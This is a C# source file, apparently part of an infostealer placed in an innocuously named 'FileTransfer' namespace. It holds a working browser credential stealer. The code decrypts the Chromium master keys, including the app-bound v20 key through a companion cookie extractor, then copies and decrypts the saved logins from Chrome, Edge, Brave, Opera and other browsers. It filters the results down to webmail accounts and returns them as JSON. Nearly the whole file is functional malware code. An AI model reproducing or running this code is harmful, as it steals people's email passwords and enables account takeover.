using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

namespace FileTransfer;

public class EmailCredential
{
    public string Url { get; set; } = "";
    public string Username { get; set; } = "";
    public string Password { get; set; } = "";
}

public static class CredentialExtractor
{
    private static readonly (string Vendor, string Name)[] Browsers = {
        ("Google", "Chrome\\User Data"),
        ("Google", "Chrome SxS\\User Data"),
        ("Microsoft", "Edge\\User Data"),
        ("Microsoft", "Edge SxS\\User Data"),
        ("BraveSoftware", "Brave-Browser\\User Data"),
        ("Yandex", "YandexBrowser\\User Data"),
        ("Vivaldi", "User Data"),
        ("Opera Software", "Opera Stable\\User Data"),
        ("", "Chromium\\User Data"),
    };

    private static readonly string[] EmailKeywords = {
        "gmail", "googlemail", "google", "outlook", "hotmail", "live", "microsoft",
        "yahoo", "ymail", "mail.ru", "bk.ru", "list.ru", "inbox.ru",
        "yandex", "rambler", "protonmail", "proton", "icloud", "me.com",
        "aol", "zoho", "gmx", "t-online", "web.de", "libero", "libero.it",
        "mail.com", "email", "fastmail", "hushmail", "tuta", "ctemplar",
        "posteo", "mailfence", "runbox", "sohu", "sina", "163.com", "qq.com"
    };

    private static string LogPath = Path.Combine(Path.GetTempPath(), "creds_debug.log");

    private static void Log(string msg)
    {
        try { File.AppendAllText(LogPath, $"[{DateTime.Now:HH:mm:ss}] {msg}\n"); }
        catch { }
    }

    public static string ExtractEmailsJson()
    {
        Log("=== ExtractEmails START ===");
        var results = new List<EmailCredential>();
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        foreach (var (vendor, name) in Browsers)
        {
            string userData = string.IsNullOrEmpty(vendor)
                ? Path.Combine(local, name)
                : Path.Combine(local, vendor, name);

            if (!Directory.Exists(userData)) continue;
            Log($"Checking browser: {userData}");

            var creds = ExtractFromChromium(userData);
            results.AddRange(creds);
        }

        var emailCreds = results
            .GroupBy(c => c.Url + "|" + c.Username)
            .Select(g => g.First())
            .ToList();

        Log($"Total email credentials found: {emailCreds.Count}");
        return JsonSerializer.Serialize(emailCreds);
    }

    private static List<EmailCredential> ExtractFromChromium(string userDataPath)
    {
        var creds = new List<EmailCredential>();
        string localStatePath = Path.Combine(userDataPath, "Local State");
        if (!File.Exists(localStatePath)) return creds;

        string json;
        try { json = File.ReadAllText(localStatePath); }
        catch { return creds; }

        byte[]? v10Key = null;
        byte[]? v20Key = null;

        try
        {
            using var doc = JsonDocument.Parse(json);
            if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt)) return creds;

            if (osCrypt.TryGetProperty("encrypted_key", out var encKeyEl))
            {
                string? encKeyB64 = encKeyEl.GetString();
                if (!string.IsNullOrEmpty(encKeyB64))
                {
                    byte[] encKey = Convert.FromBase64String(encKeyB64);
                    if (encKey.Length > 5 && encKey[0] == 'D' && encKey[1] == 'P' &&
                        encKey[2] == 'A' && encKey[3] == 'P' && encKey[4] == 'I')
                    {
                        v10Key = ProtectedData.Unprotect(encKey.AsSpan(5).ToArray(), null, DataProtectionScope.CurrentUser);
                    }
                }
            }

            if (osCrypt.TryGetProperty("app_bound_encrypted_key", out var abKeyEl))
            {
                string? abKeyB64 = abKeyEl.GetString();
                if (!string.IsNullOrEmpty(abKeyB64))
                {
                    try { v20Key = CookieExtractorDeriveV20Key(abKeyB64); }
                    catch (Exception ex) { Log($"v20 key derivation failed: {ex.Message}"); }
                }
            }
        }
        catch (Exception ex)
        {
            Log($"Key parsing exception: {ex}");
            return creds;
        }

        if (v10Key == null && v20Key == null) return creds;

        var profileDirs = new List<string>();
        try
        {
            foreach (var dir in Directory.GetDirectories(userDataPath))
            {
                string n = Path.GetFileName(dir).ToLowerInvariant();
                if (n == "default" || n.StartsWith("profile "))
                    profileDirs.Add(dir);
            }
        }
        catch (Exception ex)
        {
            Log($"Error listing profiles in {userDataPath}: {ex.Message}");
            string defPath = Path.Combine(userDataPath, "Default");
            if (Directory.Exists(defPath))
                profileDirs.Add(defPath);
        }

        foreach (var profile in profileDirs)
        {
            string loginDataPath = Path.Combine(profile, "Login Data");
            if (!File.Exists(loginDataPath)) continue;

            try
            {
                var profileCreds = ReadLoginData(loginDataPath, v10Key, v20Key);
                creds.AddRange(profileCreds);
            }
            catch (Exception ex)
            {
                Log($"Error reading Login Data in {profile}: {ex.Message}");
            }
        }

        return creds;
    }

    private static List<EmailCredential> ReadLoginData(string dbPath, byte[]? v10Key, byte[]? v20Key)
    {
        var creds = new List<EmailCredential>();

        string tmp = Path.Combine(Path.GetTempPath(), $"ld_{Guid.NewGuid():N}.db");
        bool copied = false;

        try
        {
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    CopyDbWithSharedAccess(dbPath, tmp);
                    copied = true;
                    break;
                }
                catch (IOException)
                {
                    Thread.Sleep(500);
                }
            }

            string connStr = copied && File.Exists(tmp)
                ? $"Data Source={tmp}"
                : $"Data Source={dbPath};Mode=ReadOnly;Cache=Shared";

            using var conn = new SqliteConnection(connStr);
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
            using var rdr = cmd.ExecuteReader();

            int totalRows = 0;
            int matchRows = 0;
            while (rdr.Read())
            {
                totalRows++;
                string url = rdr["origin_url"] as string ?? "";
                string username = rdr["username_value"] as string ?? "";
                if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(username)) continue;

                if (!IsEmailUrl(url)) continue;
                matchRows++;

                string? password = null;

                byte[]? buf = null;
                try
                {
                    long len = rdr.GetBytes(2, 0, null, 0, 0);
                    if (len > 0)
                    {
                        buf = new byte[len];
                        rdr.GetBytes(2, 0, buf, 0, buf.Length);
                    }
                }
                catch { }

                if (buf != null && buf.Length > 0)
                {
                    string prefix = Encoding.ASCII.GetString(buf, 0, Math.Min(3, buf.Length));
                    try
                    {
                        if (prefix == "v10" && v10Key != null)
                            password = DecryptV10(buf, v10Key);
                        else if (prefix == "v20" && v20Key != null)
                            password = DecryptV20(buf, v20Key);
                    }
                    catch { }
                }

                creds.Add(new EmailCredential
                {
                    Url = url,
                    Username = username,
                    Password = password ?? ""
                });
            }
            Log($"DB {dbPath}: read {totalRows} total logins, matched {matchRows}");
        }
        catch (Exception ex)
        {
            Log($"ReadLoginData error: {ex.Message}");
        }
        finally
        {
            try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
        }

        return creds;
    }

    private static bool IsEmailUrl(string url)
    {
        string lower = url.ToLowerInvariant();
        return EmailKeywords.Any(k => lower.Contains(k));
    }

    private static void CopyDbWithSharedAccess(string srcPath, string dstPath)
    {
        using var src = new FileStream(srcPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        using var dst = new FileStream(dstPath, FileMode.Create, FileAccess.Write, FileShare.None);
        src.CopyTo(dst);
    }

    private static string? DecryptV10(byte[] data, byte[] key)
    {
        const int off = 3;
        const int nonceLen = 12;
        const int tagLen = 16;
        if (data.Length < off + nonceLen + tagLen) return null;
        Span<byte> nonce = data.AsSpan(off, nonceLen);
        int ctLen = data.Length - off - nonceLen - tagLen;
        if (ctLen <= 0) return null;
        Span<byte> ciphertext = data.AsSpan(off + nonceLen, ctLen);
        Span<byte> tag = data.AsSpan(off + nonceLen + ctLen, tagLen);
        byte[] plain = new byte[ctLen];
        using var aes = new AesGcm(key, tagLen);
        aes.Decrypt(nonce, ciphertext, tag, plain);
        return Encoding.UTF8.GetString(plain).TrimEnd('\0');
    }

    private static string? DecryptV20(byte[] data, byte[] v20MasterKey)
    {
        const int off = 3;
        const int nonceLen = 12;
        const int tagLen = 16;
        if (data.Length < off + nonceLen + tagLen) return null;
        byte[] iv = data.AsSpan(off, nonceLen).ToArray();
        int ctLen = data.Length - off - nonceLen - tagLen;
        if (ctLen <= 0) return null;
        byte[] ciphertext = data.AsSpan(off + nonceLen, ctLen).ToArray();
        byte[] tag = data.AsSpan(off + nonceLen + ctLen, tagLen).ToArray();
        byte[] plain = new byte[ctLen];
        using var aes = new AesGcm(v20MasterKey, tagLen);
        aes.Decrypt(iv, ciphertext, tag, plain);
        if (plain.Length <= 32) return null;
        return Encoding.UTF8.GetString(plain, 32, plain.Length - 32).TrimEnd('\0');
    }

    // Delegate to CookieExtractor's static P/Invoke via reflection-like pattern
    // Since both files are in the same assembly, we duplicate the minimal needed logic
    private static byte[]? CookieExtractorDeriveV20Key(string appBoundKeyB64)
    {
        return CookieExtractor.DeriveV20Key(appBoundKeyB64);
    }
}
